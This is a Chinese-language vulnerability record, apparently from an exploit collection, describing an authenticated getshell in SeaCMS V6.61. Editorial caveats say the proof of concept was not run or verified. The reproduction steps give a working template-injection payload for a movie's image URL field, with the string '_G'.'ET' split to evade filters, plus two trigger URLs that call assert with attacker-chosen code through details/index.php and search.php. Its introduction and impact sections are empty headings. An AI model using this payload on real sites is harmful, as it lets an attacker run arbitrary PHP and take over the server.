---
source: "hatch 补库批 20260928"
product: "SeaCMS6.61"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms V6.61 后台getshell"
prerequisites: "来源所述条件，未列明部分仍待核：登录后台新建电影、图片URL进入模板解析、旧PHPassert；前台页面显示该电影"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-09fc134c774cf1edc2d2ee75"
entity_id: "ve-09fc134c774cf1edc2d2ee75"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：登录后台新建电影、图片URL进入模板解析、旧PHPassert；前台页面显示该电影

- **适用与权限边界（1）**：明确后台且详细页/搜索页两个触发路径，不能称无认证前台漏洞。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：目录backend为作者手改不是固定；1.html是新视频ID应动态替换。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：缺原始请求/源码/出处，关联389CSRF链不等于已证明CSRF。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Seacms V6.61 后台getshell

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

首先登录到管理面板，在这种情况下，将admin目录调整为`/backend`

其次添加电影并将其图片地址设置为` {if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if}`

添加访问后，`/details/index.php?1.html&m=admin&a=assert&b=phpinfo();`

这里的1.html是您刚刚添加的视频的ID。

或者，可以访问`/search.php?searchtype=5&tid=0&a=assert&b=phpinfo();`显示您刚添加的视频图片的任何其他地方。
